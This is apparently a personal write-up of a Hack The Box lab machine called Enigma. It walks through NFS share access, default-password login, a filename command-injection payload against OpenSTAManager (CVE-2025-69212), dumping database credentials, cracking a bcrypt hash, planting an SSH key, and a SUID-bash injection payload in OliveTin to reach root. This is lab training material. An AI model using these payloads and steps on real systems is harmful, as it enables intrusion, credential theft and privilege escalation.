---
title: Enigma
description: Enigma
date: '2026-09-22'
tags:
  - HTB
  - Machine
  - Pentesting
published: true
slug: enigma
category: Machine
platform: Hack The Box
---
# Enigma HTB Machine Writeup

Starting with an ip, we need to do active recon and scan for open ports using nmap:

```bash
Open ports:
80, 110, 111, 143, 993, 995, 2049, 41393, 43313, 46985, 54279, 56515
```

NFS Port is open, we can read the shares through:

```bash
sudo mkdir -p /tmp/nfs_mount
sudo mount -t nfs $IP:/srv/nfs/onboarding /tmp/nfs_mount -o nolock
ls -la /tmp/nfs_mount/
``` 

we get a PDF File, when opening we can see this:


![Screenshot From 2026-09-22 15-54-48](/images/writeups/enigma/screenshot-from-2026-09-22-15-54-48.png)


Following the url we can see an email from `sarah@enigma.htb`

so i reckoned that Enigma2024! is the default password, therefore i tried it on sarah to see if it worked, and it did:


![Screenshot From 2026-09-22 15-57-07](/images/writeups/enigma/screenshot-from-2026-09-22-15-57-07.png)

we go to support_001 subdomain and login as the admin, we discover another opensource service running on that subdomain 


![Screenshot From 2026-09-22 15-58-18](/images/writeups/enigma/screenshot-from-2026-09-22-15-58-18.png)

Lets look for CVEs:

OpenSTAManager version 2.9.8 contains multiple critical vulnerabilities that can lead to Remote Code Execution (RCE), most notably through OS Command Injection and Unauthenticated Deserialization. 

Critical RCE Vectors
OS Command Injection (`CVE-2025-69212`): A critical vulnerability exists in the P7M (signed XML) file decoding functionality (src/Util/XML.php).  An authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server via the exec() function. 


Proof of Concept (PoC) Details
Attack Vector: Upload a ZIP file via the importFE_ZIP plugin containing a .p7m file with a malicious name (e.g., invoice.p7m";INJECTED_COMMAND;echo ".p7m). 
Requirements: Authentication with invoice import access. 
Exploit Tools: Public Python scripts (e.g., by BridgerAlderson) automate this via --webshell, --rce, or --reverse-shell flags. 
Mitigation: Apply vendor patches, restrict invoice import privileges, and implement network segmentation.


upon searching, i found a script on github that renames and uploads everything automatically, therefore i used it:

https://github.com/BridgerAlderson/CVE-2025-69212-PoC

after running it with arguement `--rce`, i get:

```
www-data@target:/var/www/html/openstamanager$
```

Further enumeration reveals config.inc.php contains database password and username


```php
www-data@target:/var/www/html$ cat /var/www/html/openstamanager/config.inc.php
<?php

// Impostazioni di base per l'accesso al database
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
// $port = '|port|';
$db_options = [
    // 'sort_buffer_size' => '2M',
]; 
<SNIP>
```

upon logging into the database:

```sql
SHOW DATABASES;
```

we find openstamanager

```sql
USE openstamanager;
```

Then to see the tables:

```sql
SHOW TABLES;
```

We find a bunch of tables, but the interesting one was `zz_users`
So we run:
```sql
SELECT * FROM zz_users;
```

and we can find:
```
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
| id | username | password                                                     | email            | idanagrafica | idgruppo | enabled | created_at          | updated_at          | reset_token | image_file_id | options |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
|  1 | admin    | $2y$10$rTJVUNyGGKPlhw2cFdf5AeDHVMhnIChddcHx2XxVLMQS2KsuSz4Pu | admin@enigma.htb |            1 |        1 |       1 | 2026-02-18 19:26:52 | 2026-02-18 19:26:52 | NULL        |          NULL |         |
|  2 | haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC | haris@enigma.htb |            1 |        5 |       1 | 2026-02-18 20:58:28 | 2026-05-26 11:07:03 | NULL        |          NULL |         |
+----+----------+--------------------------------------------------------------+------------------+--------------+----------+---------+---------------------+---------------------+-------------+---------------+---------+
```


lets crack haris' hash: 

`$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC`

```

$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNp...ZDr6eC
Time.Started.....: Tue Sep 22 14:33:15 2026 (3 secs)
Time.Estimated...: Tue Sep 22 14:33:18 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-72 bytes)
Guess.Base.......: File (/home/nabil/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:      275 H/s (17.42ms) @ Accel:1 Loops:32 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 770/14344384 (0.01%)
Rejected.........: 0/770 (0.00%)
Restore.Point....: 616/14344384 (0.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:992-1024
Candidate.Engine.: Device Generator
Candidates.#01...: bradley -> eagles
Hardware.Mon.#01.: Temp: 48c Fan: 28% Util:100% Core:1935MHz Mem:4001MHz Bus:16
```

Bro's password is bestfriends ☠️

anyways

so what i tried to do is login through ssh and it aint work because it requires keys to login 

so instead on my shell, i just done su haris and entered the password, so i lowkey created SSH key so i can use them on my local machine and login as him

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ""
cat ~/.ssh/id_ed25519.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
cat ~/.ssh/id_ed25519   # <-- i copied the private key which is this 
```


and then yeah, i logged in using it on my local machine

Further enumaration as the user haris, we found an internal service running at port 1337 as root defined as OliveTin which is another opensource app

Lets forward the app to our machine:

```bash
ssh -L 1337:127.0.0.1:1337 haris@enigma.htb
```

and we find the config.yaml file:
The configuration contained a Backup Database action:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
```

The db_pass parameter is vulnerable to command injection


in the website we pass the payload:

```
test'; chmod +s /bin/bash; echo '
```


on the haris box doing `ls -la /bin/bash` shows us that the command executed and the binary has a SUID now

meaning we can run that shit

```bash
/bin/bash -p

id
uid=0(root) gid=0(root) groups=0(root)
```


and we can get the flag and boom 
